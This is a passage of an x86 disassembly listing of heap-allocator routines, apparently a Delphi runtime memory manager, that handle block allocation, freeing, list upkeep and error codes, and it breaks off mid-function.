                push    40183Eh
                push    dword ptr fs:[edx]
                mov     fs:[edx], esp
                push    40A5B4h
                call    sub_4DC
                cmp     byte ptr ds:40A035h, 0
                jz      short loc_BB6
                push    40A5B4h
                call    sub_4E4

loc_BB6:                                ; CODE XREF: sub_B88+22↑j
                mov     eax, 40A5D4h
                call    sub_54C
                mov     eax, 40A5E4h
                call    sub_54C
                mov     eax, 40A610h
                call    sub_54C
                push    0FF8h
                push    0
                call    sub_4BC
                mov     ds:40A60Ch, eax
                cmp     dword ptr ds:40A60Ch, 0
                jz      short loc_C1D
                mov     eax, 3

loc_BF3:                                ; CODE XREF: sub_B88+7D↓j
                mov     edx, ds:40A60Ch
                xor     ecx, ecx
                mov     [edx+eax*4-0Ch], ecx
                inc     eax
                cmp     eax, 401h
                jnz     short loc_BF3
                mov     eax, 40A5F4h
                mov     [eax+4], eax
                mov     [eax], eax
                mov     ds:40A600h, eax
                mov     byte ptr ds:40A5ACh, 1

loc_C1D:                                ; CODE XREF: sub_B88+64↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    401845h

loc_C2A:                                ; CODE XREF: CODE:00000C43↓j
                cmp     byte ptr ds:40A035h, 0
                jz      short locret_C3D
                push    40A5B4h
                call    sub_4EC

locret_C3D:                             ; CODE XREF: sub_B88+A9↑j
                retn
sub_B88         endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_C2A
; ---------------------------------------------------------------------------
                mov     al, ds:40A5ACh
                pop     ebp
                retn

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_C4C         proc near               ; CODE XREF: CODE:0000315F↓p

var_s0          = dword ptr  0

; FUNCTION CHUNK AT 00001F30 SIZE 00000036 BYTES

                push    ebp
                mov     ebp, esp
                push    ebx
                cmp     byte ptr ds:40A5ACh, 0
                jz      loc_D29
                xor     edx, edx
                push    ebp
                push    401922h
                push    dword ptr fs:[edx]
                mov     fs:[edx], esp
                cmp     byte ptr ds:40A035h, 0
                jz      short loc_C7E
                push    40A5B4h
                call    sub_4E4

loc_C7E:                                ; CODE XREF: sub_C4C+26↑j
                mov     byte ptr ds:40A5ACh, 0
                mov     eax, ds:40A60Ch
                push    eax
                call    sub_4C4
                xor     eax, eax
                mov     ds:40A60Ch, eax
                mov     ebx, ds:40A5D4h
                jmp     short loc_CB1
; ---------------------------------------------------------------------------

loc_C9F:                                ; CODE XREF: sub_C4C+6B↓j
                push    8000h
                push    0
                mov     eax, [ebx+8]
                push    eax
                call    sub_4D4
                mov     ebx, [ebx]

loc_CB1:                                ; CODE XREF: sub_C4C+51↑j
                cmp     ebx, 40A5D4h
                jnz     short loc_C9F
                mov     eax, 40A5D4h
                call    sub_54C
                mov     eax, 40A5E4h
                call    sub_54C
                mov     eax, 40A610h
                call    sub_54C
                mov     eax, ds:40A5CCh
                test    eax, eax
                jz      short loc_CF7

loc_CE0:                                ; CODE XREF: sub_C4C+A9↓j
                mov     edx, [eax]
                mov     ds:40A5CCh, edx
                push    eax
                call    sub_4C4
                mov     eax, ds:40A5CCh
                test    eax, eax
                jnz     short loc_CE0

loc_CF7:                                ; CODE XREF: sub_C4C+92↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    401929h

loc_D04:                                ; CODE XREF: sub_C4C+DB↓j
                cmp     byte ptr ds:40A035h, 0
                jz      short loc_D17
                push    40A5B4h
                call    sub_4EC

loc_D17:                                ; CODE XREF: sub_C4C+BF↑j
                push    40A5B4h
                call    sub_4F4
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_D04
; ---------------------------------------------------------------------------

loc_D29:                                ; CODE XREF: sub_C4C+B↑j
                pop     ebx
                pop     ebp
                retn
sub_C4C         endp


; =============== S U B R O U T I N E =======================================


sub_D2C         proc near               ; CODE XREF: sub_E3C:loc_E9D↓p
                                        ; sub_EAC+23↓p ...
                push    ebx
                cmp     eax, ds:40A600h
                jnz     short loc_D3E
                mov     edx, [eax+4]
                mov     ds:40A600h, edx

loc_D3E:                                ; CODE XREF: sub_D2C+7↑j
                mov     edx, [eax+4]
                mov     ecx, [eax+8]
                cmp     ecx, 1000h
                jg      short loc_D84
                cmp     eax, edx
                jnz     short loc_D67
                test    ecx, ecx
                jns     short loc_D57
                add     ecx, 3

loc_D57:                                ; CODE XREF: sub_D2C+26↑j
                sar     ecx, 2
                mov     eax, ds:40A60Ch
                xor     edx, edx
                mov     [eax+ecx*4-0Ch], edx
                jmp     short loc_D8B
; ---------------------------------------------------------------------------

loc_D67:                                ; CODE XREF: sub_D2C+22↑j
                test    ecx, ecx
                jns     short loc_D6E
                add     ecx, 3

loc_D6E:                                ; CODE XREF: sub_D2C+3D↑j
                sar     ecx, 2
                mov     ebx, ds:40A60Ch
                mov     [ebx+ecx*4-0Ch], edx
                mov     eax, [eax]
                mov     [edx], eax
                mov     [eax+4], edx
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_D84:                                ; CODE XREF: sub_D2C+1E↑j
                mov     eax, [eax]
                mov     [edx], eax
                mov     [eax+4], edx

loc_D8B:                                ; CODE XREF: sub_D2C+39↑j
                pop     ebx
                retn
sub_D2C         endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_D90         proc near               ; CODE XREF: sub_EE4+11↓p
                mov     edx, ds:40A610h
                jmp     short loc_DA8
; ---------------------------------------------------------------------------

loc_D98:                                ; CODE XREF: sub_D90+1E↓j
                mov     ecx, [edx+8]
                cmp     eax, ecx
                jb      short loc_DA6
                add     ecx, [edx+0Ch]
                cmp     eax, ecx
                jb      short loc_DBC

loc_DA6:                                ; CODE XREF: sub_D90+D↑j
                mov     edx, [edx]

loc_DA8:                                ; CODE XREF: sub_D90+6↑j
                cmp     edx, 40A610h
                jnz     short loc_D98
                mov     dword ptr ds:40A5B0h, 3
                xor     edx, edx

loc_DBC:                                ; CODE XREF: sub_D90+14↑j
                mov     eax, edx
                retn
sub_D90         endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_DC0         proc near               ; CODE XREF: sub_EE4+74↓p
                                        ; sub_1068+68↓p
                push    ebx
                mov     ecx, edx
                sub     ecx, 4
                lea     ebx, [ecx+eax]
                cmp     edx, 10h
                jl      short loc_DDD
                mov     dword ptr [ebx], 80000007h
                mov     edx, ecx
                call    sub_F94
                pop     ebx
                retn
; ---------------------------------------------------------------------------

loc_DDD:                                ; CODE XREF: sub_DC0+C↑j
                cmp     edx, 4
                jl      short loc_DEE
                mov     ecx, edx
                or      ecx, 80000002h
                mov     [eax], ecx
                mov     [ebx], ecx

loc_DEE:                                ; CODE XREF: sub_DC0+20↑j
                pop     ebx
                retn
sub_DC0         endp


; =============== S U B R O U T I N E =======================================


sub_DF0         proc near               ; CODE XREF: sub_E14+D↓p
                                        ; sub_101C+36↓p ...
                inc     dword ptr ds:40A59Ch
                mov     edx, eax
                sub     edx, 4
                mov     edx, [edx]
                and     edx, 7FFFFFFCh
                sub     edx, 4
                add     ds:40A5A0h, edx
                call    sub_1404
                retn
sub_DF0         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_E14         proc near               ; CODE XREF: sub_EE4+8E↓p
                cmp     edx, 0Ch
                jl      short loc_E27
                or      edx, 2
                mov     [eax], edx
                add     eax, 4
                call    sub_DF0
                retn
; ---------------------------------------------------------------------------

loc_E27:                                ; CODE XREF: sub_E14+3↑j
                cmp     edx, 4
                jl      short loc_E36
                mov     ecx, edx
                or      ecx, 80000002h
                mov     [eax], ecx

loc_E36:                                ; CODE XREF: sub_E14+16↑j
                add     eax, edx
                and     dword ptr [eax], 0FFFFFFFEh
                retn
sub_E14         endp


; =============== S U B R O U T I N E =======================================


sub_E3C         proc near               ; CODE XREF: sub_1068+36↓p
                push    ebx
                push    esi
                mov     edx, eax
                sub     edx, 4
                mov     edx, [edx]
                mov     ecx, edx
                and     ecx, 80000002h
                cmp     ecx, 80000002h
                jz      short loc_E5F
                mov     dword ptr ds:40A5B0h, 4

loc_E5F:                                ; CODE XREF: sub_E3C+17↑j
                mov     ebx, edx
                and     ebx, 7FFFFFFCh
                sub     eax, ebx
                mov     ecx, eax
                xor     edx, [ecx]
                test    edx, 0FFFFFFFEh
                jz      short loc_E7F
                mov     dword ptr ds:40A5B0h, 5

loc_E7F:                                ; CODE XREF: sub_E3C+37↑j
                test    byte ptr [ecx], 1
                jz      short loc_EA4
                mov     edx, eax
                sub     edx, 0Ch
                mov     esi, [edx+8]
                sub     eax, esi
                cmp     esi, [eax+8]
                jz      short loc_E9D
                mov     dword ptr ds:40A5B0h, 6

loc_E9D:                                ; CODE XREF: sub_E3C+55↑j
                call    sub_D2C
                add     ebx, esi

loc_EA4:                                ; CODE XREF: sub_E3C+46↑j
                mov     eax, ebx
                pop     esi
                pop     ebx
                retn
sub_E3C         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_EAC         proc near               ; CODE XREF: sub_1068+4F↓p
                push    ebx
                push    esi
                push    edi
                mov     ebx, eax
                xor     edi, edi
                mov     eax, [ebx]
                test    eax, 80000000h
                jz      short loc_EC7
                and     eax, 7FFFFFFCh
                add     edi, eax
                add     ebx, eax
                mov     eax, [ebx]

loc_EC7:                                ; CODE XREF: sub_EAC+E↑j
                test    al, 2
                jnz     short loc_EDE
                mov     esi, ebx
                mov     eax, esi
                call    sub_D2C
                mov     eax, [esi+8]
                add     edi, eax
                add     ebx, eax
                and     dword ptr [ebx], 0FFFFFFFEh

loc_EDE:                                ; CODE XREF: sub_EAC+1D↑j
                mov     eax, edi
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_EAC         endp


; =============== S U B R O U T I N E =======================================


sub_EE4         proc near               ; CODE XREF: sub_F94+61↓p

var_1C          = byte ptr -1Ch
var_1B          = dword ptr -1Bh
var_17          = dword ptr -17h

                push    ebx
                push    esi
                push    edi
                push    ebp
                add     esp, 0FFFFFFF4h
                mov     edi, edx
                mov     esi, eax
                mov     [esp+1Ch+var_1C], 0
                mov     eax, esi
                call    sub_D90
                mov     ebx, eax
                test    ebx, ebx
                jz      loc_F86
                mov     ebp, [ebx+8]
                mov     eax, ebp
                add     eax, [ebx+0Ch]
                mov     edx, eax
                lea     ecx, [edi+esi]
                sub     edx, ecx
                cmp     edx, 0Ch
                jg      short loc_F1C
                mov     edi, eax
                sub     edi, esi

loc_F1C:                                ; CODE XREF: sub_EE4+32↑j
                mov     eax, esi
                sub     eax, ebp
                cmp     eax, 0Ch
                jge     short loc_F39
                lea     ecx, [esp+1Ch+var_1B]
                mov     edx, esi
                sub     edx, [ebx+8]
                add     edx, edi
                mov     eax, ebp
                call    sub_AFC
                jmp     short loc_F4A
; ---------------------------------------------------------------------------

loc_F39:                                ; CODE XREF: sub_EE4+3F↑j
                lea     ecx, [esp+1Ch+var_1B]
                mov     edx, edi
                sub     edx, 4
                lea     eax, [esi+4]
                call    sub_AFC

loc_F4A:                                ; CODE XREF: sub_EE4+53↑j
                mov     ebp, [esp+1Ch+var_1B]
                test    ebp, ebp
                jz      short loc_F86
                mov     edx, ebp
                sub     edx, esi
                mov     eax, esi
                call    sub_DC0
                mov     eax, ebp
                add     eax, [esp+1Ch+var_17]
                mov     edx, [ebx+8]
                add     edx, [ebx+0Ch]
                cmp     eax, edx
                jnb     short loc_F77
                lea     edx, [edi+esi]
                sub     edx, eax
                call    sub_E14

loc_F77:                                ; CODE XREF: sub_EE4+87↑j
                lea     edx, [esp+1Ch+var_1B]
                mov     eax, ebx
                call    sub_60C
                mov     [esp+1Ch+var_1C], 1

loc_F86:                                ; CODE XREF: sub_EE4+1A↑j
                                        ; sub_EE4+6C↑j
                mov     al, [esp+1Ch+var_1C]
                add     esp, 0Ch
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_EE4         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_F94         proc near               ; CODE XREF: sub_DC0+16↑p
                                        ; sub_1180+BB↓p ...
                push    ebx
                push    esi
                push    edi
                mov     esi, edx
                mov     edi, eax
                mov     ebx, edi
                mov     [ebx+8], esi
                mov     eax, ebx
                add     eax, esi
                sub     eax, 0Ch
                mov     [eax+8], esi
                cmp     esi, 1000h
                jg      short loc_FE9
                mov     edx, esi
                test    edx, edx
                jns     short loc_FBB
                add     edx, 3

loc_FBB:                                ; CODE XREF: sub_F94+22↑j
                sar     edx, 2
                mov     eax, ds:40A60Ch
                mov     eax, [eax+edx*4-0Ch]
                test    eax, eax
                jnz     short loc_FDB
                mov     eax, ds:40A60Ch
                mov     [eax+edx*4-0Ch], ebx
                mov     [ebx+4], ebx
                mov     [ebx], ebx
                jmp     short loc_1015
; ---------------------------------------------------------------------------

loc_FDB:                                ; CODE XREF: sub_F94+35↑j
                mov     edx, [eax]
                mov     [ebx+4], eax
                mov     [ebx], edx
                mov     [eax], ebx
                mov     [edx+4], ebx
                jmp     short loc_1015
; ---------------------------------------------------------------------------

loc_FE9:                                ; CODE XREF: sub_F94+1C↑j
                cmp     esi, 3C00h
                jl      short loc_FFE
                mov     edx, esi
                mov     eax, edi
                call    sub_EE4
                test    al, al
                jnz     short loc_1015

loc_FFE:                                ; CODE XREF: sub_F94+5B↑j
                mov     eax, ds:40A600h
                mov     ds:40A600h, ebx
                mov     edx, [eax]
                mov     [ebx+4], eax
                mov     [ebx], edx
                mov     [eax], ebx
                mov     [edx+4], ebx

loc_1015:                               ; CODE XREF: sub_F94+45↑j
                                        ; sub_F94+53↑j ...
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_F94         endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_101C        proc near               ; CODE XREF: sub_1068+F↓p
                                        ; sub_1404+100↓p ...
                cmp     dword ptr ds:40A604h, 0
                jle     short locret_1065
                cmp     dword ptr ds:40A604h, 0Ch
                jge     short loc_103A
                mov     dword ptr ds:40A5B0h, 7
                jmp     short locret_1065
; ---------------------------------------------------------------------------

loc_103A:                               ; CODE XREF: sub_101C+10↑j
                mov     eax, ds:40A604h
                or      eax, 2
                mov     edx, ds:40A608h
                mov     [edx], eax
                mov     eax, ds:40A608h
                add     eax, 4
                call    sub_DF0
                xor     eax, eax
                mov     ds:40A608h, eax
                xor     eax, eax
                mov     ds:40A604h, eax

locret_1065:                            ; CODE XREF: sub_101C+7↑j
                                        ; sub_101C+1C↑j
                retn
sub_101C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_1068        proc near               ; CODE XREF: sub_10F4+18↓p
                                        ; sub_1120+1D↓p

var_1C          = byte ptr -1Ch
var_14          = dword ptr -14h
var_10          = dword ptr -10h

                push    ebx
                push    esi
                push    edi
                add     esp, 0FFFFFFF0h
                mov     esi, eax
                lea     edi, [esp+1Ch+var_1C]
                movsd
                movsd
                mov     edi, esp
                call    sub_101C
                lea     ecx, [esp+1Ch+var_14]
                mov     edx, edi
                mov     eax, 40A610h
                call    sub_59C
                mov     ebx, [esp+1Ch+var_14]
                test    ebx, ebx
                jnz     short loc_1098
                xor     eax, eax
                jmp     short loc_10EA
; ---------------------------------------------------------------------------

loc_1098:                               ; CODE XREF: sub_1068+2A↑j
                mov     eax, [edi]
                cmp     ebx, eax
                jnb     short loc_10A8
                call    sub_E3C
                sub     [edi], eax
                add     [edi+4], eax

loc_10A8:                               ; CODE XREF: sub_1068+34↑j
                mov     eax, [edi]
                add     eax, [edi+4]
                mov     esi, ebx
                add     esi, [esp+1Ch+var_10]
                cmp     eax, esi
                jnb     short loc_10BF
                call    sub_EAC
                add     [edi+4], eax

loc_10BF:                               ; CODE XREF: sub_1068+4D↑j
                mov     eax, [edi]
                add     eax, [edi+4]
                cmp     esi, eax
                jnz     short loc_10D9
                sub     eax, 4
                mov     edx, 4
                call    sub_DC0
                sub     dword ptr [edi+4], 4

loc_10D9:                               ; CODE XREF: sub_1068+5E↑j
                mov     eax, [edi]
                mov     ds:40A608h, eax
                mov     eax, [edi+4]
                mov     ds:40A604h, eax
                mov     al, 1

loc_10EA:                               ; CODE XREF: sub_1068+2E↑j
                add     esp, 10h
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_1068        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_10F4        proc near               ; CODE XREF: sub_1180+57↓p

var_C           = dword ptr -0Ch

                push    ebx
                add     esp, 0FFFFFFF8h
                mov     ebx, eax
                mov     edx, esp
                lea     eax, [ebx+4]
                call    sub_948
                cmp     [esp+0Ch+var_C], 0
                jz      short loc_1115
                mov     eax, esp
                call    sub_1068
                test    al, al
                jnz     short loc_1119

loc_1115:                               ; CODE XREF: sub_10F4+14↑j
                xor     eax, eax
                jmp     short loc_111B
; ---------------------------------------------------------------------------

loc_1119:                               ; CODE XREF: sub_10F4+1F↑j
                mov     al, 1

loc_111B:                               ; CODE XREF: sub_10F4+23↑j
                pop     ecx
                pop     edx
                pop     ebx
                retn
sub_10F4        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_1120        proc near               ; CODE XREF: sub_15A8+1A4↓p

var_10          = dword ptr -10h

                push    ebx
                push    esi
                add     esp, 0FFFFFFF8h
                mov     esi, edx
                mov     ebx, eax
                mov     ecx, esp
                lea     edx, [esi+4]
                mov     eax, ebx
                call    sub_9D8
                cmp     [esp+10h+var_10], 0
                jz      short loc_1146
                mov     eax, esp
                call    sub_1068
                test    al, al
                jnz     short loc_114A

loc_1146:                               ; CODE XREF: sub_1120+19↑j
                xor     eax, eax
                jmp     short loc_114C
; ---------------------------------------------------------------------------

loc_114A:                               ; CODE XREF: sub_1120+24↑j
                mov     al, 1

loc_114C:                               ; CODE XREF: sub_1120+28↑j
                pop     ecx
                pop     edx
                pop     esi
                pop     ebx
                retn
sub_1120        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_1154        proc near               ; CODE XREF: sub_1180+4A↓p
                xor     edx, edx
                test    eax, eax
                jns     short loc_115D
                add     eax, 3

loc_115D:                               ; CODE XREF: sub_1154+4↑j
                sar     eax, 2
                cmp     eax, 400h
                jg      short loc_117D

loc_1167:                               ; CODE XREF: sub_1154+27↓j
                mov     edx, ds:40A60Ch
                mov     edx, [edx+eax*4-0Ch]
                test    edx, edx
                jnz     short loc_117D
                inc     eax
                cmp     eax, 401h
                jnz     short loc_1167

loc_117D:                               ; CODE XREF: sub_1154+11↑j
                                        ; sub_1154+1F↑j
                mov     eax, edx
                retn
sub_1154        endp


; =============== S U B R O U T I N E =======================================


sub_1180        proc near               ; CODE XREF: sub_1274+153↓p
                push    ebx
                push    esi
                push    edi
                push    ebp
                mov     esi, eax
                mov     edi, 40A600h
                mov     ebp, 40A604h

loc_1190:                               ; CODE XREF: sub_1180+6A↓j
                mov     ebx, ds:40A5F8h
                cmp     esi, [ebx+8]
                jle     loc_1223
                mov     ebx, [edi]
                mov     eax, [ebx+8]
                cmp     esi, eax
                jle     short loc_1223
                mov     [ebx+8], esi

loc_11AB:                               ; CODE XREF: sub_1180+31↓j
                mov     ebx, [ebx+4]
                cmp     esi, [ebx+8]
                jg      short loc_11AB
                mov     edx, [edi]
                mov     [edx+8], eax
                cmp     ebx, [edi]
                jz      short loc_11C0
                mov     [edi], ebx
                jmp     short loc_1223
; ---------------------------------------------------------------------------

loc_11C0:                               ; CODE XREF: sub_1180+3A↑j
                cmp     esi, 1000h
                jg      short loc_11D5
                mov     eax, esi
                call    sub_1154
                mov     ebx, eax
                test    ebx, ebx
                jnz     short loc_1223

loc_11D5:                               ; CODE XREF: sub_1180+46↑j
                mov     eax, esi
                call    sub_10F4
                test    al, al
                jnz     short loc_11E7
                xor     eax, eax
                jmp     loc_126F
; ---------------------------------------------------------------------------

loc_11E7:                               ; CODE XREF: sub_1180+5E↑j
                cmp     esi, [ebp+0]
                jg      short loc_1190
                sub     [ebp+0], esi
                cmp     dword ptr [ebp+0], 0Ch
                jge     short loc_11FD
                add     esi, [ebp+0]
                xor     eax, eax
                mov     [ebp+0], eax

loc_11FD:                               ; CODE XREF: sub_1180+73↑j
                mov     eax, ds:40A608h
                add     ds:40A608h, esi
                mov     edx, esi
                or      edx, 2
                mov     [eax], edx
                add     eax, 4
                inc     dword ptr ds:40A59Ch
                sub     esi, 4
                add     ds:40A5A0h, esi
                jmp     short loc_126F
; ---------------------------------------------------------------------------

loc_1223:                               ; CODE XREF: sub_1180+19↑j
                                        ; sub_1180+26↑j ...
                mov     eax, ebx
                call    sub_D2C
                mov     edx, [ebx+8]
                mov     eax, edx
                sub     eax, esi
                cmp     eax, 0Ch
                jl      short loc_1242
                mov     edx, ebx
                add     edx, esi
                xchg    eax, edx
                call    sub_F94
                jmp     short loc_1254
; ---------------------------------------------------------------------------

loc_1242:                               ; CODE XREF: sub_1180+B4↑j
                mov     esi, edx
                cmp     ebx, [edi]
                jnz     short loc_124D
                mov     eax, [ebx+4]
                mov     [edi], eax

loc_124D:                               ; CODE XREF: sub_1180+C6↑j
                mov     eax, ebx
                add     eax, esi
                and     dword ptr [eax], 0FFFFFFFEh

loc_1254:                               ; CODE XREF: sub_1180+C0↑j
                mov     eax, ebx
                mov     edx, esi
                or      edx, 2
                mov     [eax], edx
                add     eax, 4
                inc     dword ptr ds:40A59Ch
                sub     esi, 4
                add     ds:40A5A0h, esi

loc_126F:                               ; CODE XREF: sub_1180+62↑j
                                        ; sub_1180+A1↑j
                pop     ebp
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_1180        endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1274        proc near               ; CODE XREF: CODE:000017E0↓p

var_8           = dword ptr -8
var_4           = dword ptr -4

; FUNCTION CHUNK AT 00001F30 SIZE 00000036 BYTES

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFFF8h
                push    ebx
                push    esi
                push    edi
                mov     ebx, eax
                cmp     byte ptr ds:40A5ACh, 0
                jnz     short loc_1291
                call    sub_B88
                test    al, al
                jz      short loc_1299

loc_1291:                               ; CODE XREF: sub_1274+12↑j
                cmp     ebx, 7FFFFFF8h
                jle     short loc_12A3

loc_1299:                               ; CODE XREF: sub_1274+1B↑j
                xor     eax, eax
                mov     [ebp+var_4], eax
                jmp     loc_13F7
; ---------------------------------------------------------------------------

loc_12A3:                               ; CODE XREF: sub_1274+23↑j
                xor     ecx, ecx
                push    ebp
                push    401FF0h
                push    dword ptr fs:[ecx]
                mov     fs:[ecx], esp
                cmp     byte ptr ds:40A035h, 0
                jz      short loc_12C4
                push    40A5B4h
                call    sub_4E4

loc_12C4:                               ; CODE XREF: sub_1274+44↑j
                add     ebx, 7
                and     ebx, 0FFFFFFFCh
                cmp     ebx, 0Ch
                jge     short loc_12D4
                mov     ebx, 0Ch

loc_12D4:                               ; CODE XREF: sub_1274+59↑j
                cmp     ebx, 1000h
                jg      loc_1373
                mov     eax, ebx
                test    eax, eax
                jns     short loc_12E9
                add     eax, 3

loc_12E9:                               ; CODE XREF: sub_1274+70↑j
                sar     eax, 2
                mov     edx, ds:40A60Ch
                mov     edx, [edx+eax*4-0Ch]
                test    edx, edx
                jz      short loc_1373
                mov     esi, edx
                mov     eax, esi
                add     eax, ebx
                and     dword ptr [eax], 0FFFFFFFEh
                mov     eax, [edx+4]
                cmp     edx, eax
                jnz     short loc_1324
                mov     eax, ebx
                test    eax, eax
                jns     short loc_1313
                add     eax, 3

loc_1313:                               ; CODE XREF: sub_1274+9A↑j
                sar     eax, 2
                mov     ecx, ds:40A60Ch
                xor     edi, edi
                mov     [ecx+eax*4-0Ch], edi
                jmp     short loc_134A
; ---------------------------------------------------------------------------

loc_1324:                               ; CODE XREF: sub_1274+94↑j
                mov     ecx, ebx
                test    ecx, ecx
                jns     short loc_132D
                add     ecx, 3

loc_132D:                               ; CODE XREF: sub_1274+B4↑j
                sar     ecx, 2
                mov     edi, ds:40A60Ch
                mov     [edi+ecx*4-0Ch], eax
                mov     ecx, [edx]
                mov     [ebp+var_8], ecx
                mov     ecx, [ebp+var_8]
                mov     [ecx+4], eax
                mov     ecx, [ebp+var_8]
                mov     [eax], ecx

loc_134A:                               ; CODE XREF: sub_1274+AE↑j
                mov     eax, esi
                mov     edx, [edx+8]
                or      edx, 2
                mov     [eax], edx
                add     eax, 4
                mov     [ebp+var_4], eax
                inc     dword ptr ds:40A59Ch
                sub     ebx, 4
                add     ds:40A5A0h, ebx
                call    sub_1FEC
                jmp     loc_13F7
; ---------------------------------------------------------------------------

loc_1373:                               ; CODE XREF: sub_1274+66↑j
                                        ; sub_1274+84↑j
                cmp     ebx, ds:40A604h
                jg      short loc_13C5
                sub     ds:40A604h, ebx
                cmp     dword ptr ds:40A604h, 0Ch
                jge     short loc_1397
                add     ebx, ds:40A604h
                xor     eax, eax
                mov     ds:40A604h, eax

loc_1397:                               ; CODE XREF: sub_1274+114↑j
                mov     eax, ds:40A608h
                add     ds:40A608h, ebx
                mov     edx, ebx
                or      edx, 2
                mov     [eax], edx
                add     eax, 4
                mov     [ebp+var_4], eax
                inc     dword ptr ds:40A59Ch
                sub     ebx, 4
                add     ds:40A5A0h, ebx
                call    sub_1FEC
                jmp     short loc_13F7
; ---------------------------------------------------------------------------

loc_13C5:                               ; CODE XREF: sub_1274+105↑j
                mov     eax, ebx
                call    sub_1180
                mov     [ebp+var_4], eax
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    401FF7h

loc_13DC:                               ; CODE XREF: sub_1274+181↓j
                cmp     byte ptr ds:40A035h, 0
                jz      short locret_13EF
                push    40A5B4h
                call    sub_4EC

locret_13EF:                            ; CODE XREF: sub_1274+16F↑j
                retn
; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_13DC
; ---------------------------------------------------------------------------

loc_13F7:                               ; CODE XREF: sub_1274+2A↑j
                                        ; sub_1274+FA↑j ...
                mov     eax, [ebp+var_4]
                pop     edi
                pop     esi
                pop     ebx
                pop     ecx
                pop     ecx
                pop     ebp
                retn
sub_1274        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_1404        proc near               ; CODE XREF: sub_DF0+1C↑p
                                        ; CODE:0000180C↓p

var_4           = dword ptr -4

; FUNCTION CHUNK AT 00001F30 SIZE 00000036 BYTES

                push    ebp
                mov     ebp, esp
                push    ecx
                push    ebx
                push    esi
                push    edi
                mov     ebx, eax
                xor     eax, eax
                mov     ds:40A5B0h, eax
                cmp     byte ptr ds:40A5ACh, 0
                jnz     short loc_143C
                call    sub_B88
                test    al, al
                jnz     short loc_143C
                mov     dword ptr ds:40A5B0h, 8
                mov     [ebp+var_4], 8
                jmp     loc_159D
; ---------------------------------------------------------------------------

loc_143C:                               ; CODE XREF: sub_1404+17↑j
                                        ; sub_1404+20↑j
                xor     ecx, ecx
                push    ebp
                push    402196h
                push    dword ptr fs:[ecx]
                mov     fs:[ecx], esp
                cmp     byte ptr ds:40A035h, 0
                jz      short loc_145D
                push    40A5B4h
                call    sub_4E4

loc_145D:                               ; CODE XREF: sub_1404+4D↑j
                mov     esi, ebx
                sub     esi, 4
                mov     ebx, [esi]
                test    bl, 2
                jnz     short loc_1478
                mov     dword ptr ds:40A5B0h, 9
                jmp     loc_156D
; ---------------------------------------------------------------------------

loc_1478:                               ; CODE XREF: sub_1404+63↑j
                dec     dword ptr ds:40A59Ch
                mov     eax, ebx
                and     eax, 7FFFFFFCh
                sub     eax, 4
                sub     ds:40A5A0h, eax
                test    bl, 1
                jz      short loc_14D8
                mov     eax, esi
                sub     eax, 0Ch
                mov     edx, [eax+8]
                cmp     edx, 0Ch
                jl      short loc_14A8
                test    edx, 80000003h
                jz      short loc_14B7

loc_14A8:                               ; CODE XREF: sub_1404+9A↑j
                mov     dword ptr ds:40A5B0h, 0Ah
                jmp     loc_156D
; ---------------------------------------------------------------------------

loc_14B7:                               ; CODE XREF: sub_1404+A2↑j
                mov     eax, esi
                sub     eax, edx
                cmp     edx, [eax+8]
                jz      short loc_14CF
                mov     dword ptr ds:40A5B0h, 0Ah
                jmp     loc_156D
; ---------------------------------------------------------------------------

loc_14CF:                               ; CODE XREF: sub_1404+BA↑j
                add     ebx, edx
                mov     esi, eax
                call    sub_D2C

loc_14D8:                               ; CODE XREF: sub_1404+8D↑j
                and     ebx, 7FFFFFFCh
                mov     eax, esi
                add     eax, ebx
                mov     edi, eax
                cmp     edi, ds:40A608h
                jnz     short loc_1518
                sub     ds:40A608h, ebx
                add     ds:40A604h, ebx
                cmp     dword ptr ds:40A604h, 3C00h
                jle     short loc_1509
                call    sub_101C

loc_1509:                               ; CODE XREF: sub_1404+FE↑j
                xor     eax, eax
                mov     [ebp+var_4], eax
                call    sub_1FEC
                jmp     loc_159D
; ---------------------------------------------------------------------------

loc_1518:                               ; CODE XREF: sub_1404+E6↑j
                mov     edx, [eax]
                test    dl, 2
                jz      short loc_153B
                and     edx, 7FFFFFFCh
                cmp     edx, 4
                jge     short loc_1536
                mov     dword ptr ds:40A5B0h, 0Bh
                jmp     short loc_156D
; ---------------------------------------------------------------------------

loc_1536:                               ; CODE XREF: sub_1404+124↑j
                or      dword ptr [eax], 1
                jmp     short loc_1564
; ---------------------------------------------------------------------------

loc_153B:                               ; CODE XREF: sub_1404+119↑j
                mov     eax, edi
                cmp     dword ptr [eax+4], 0
                jz      short loc_154E
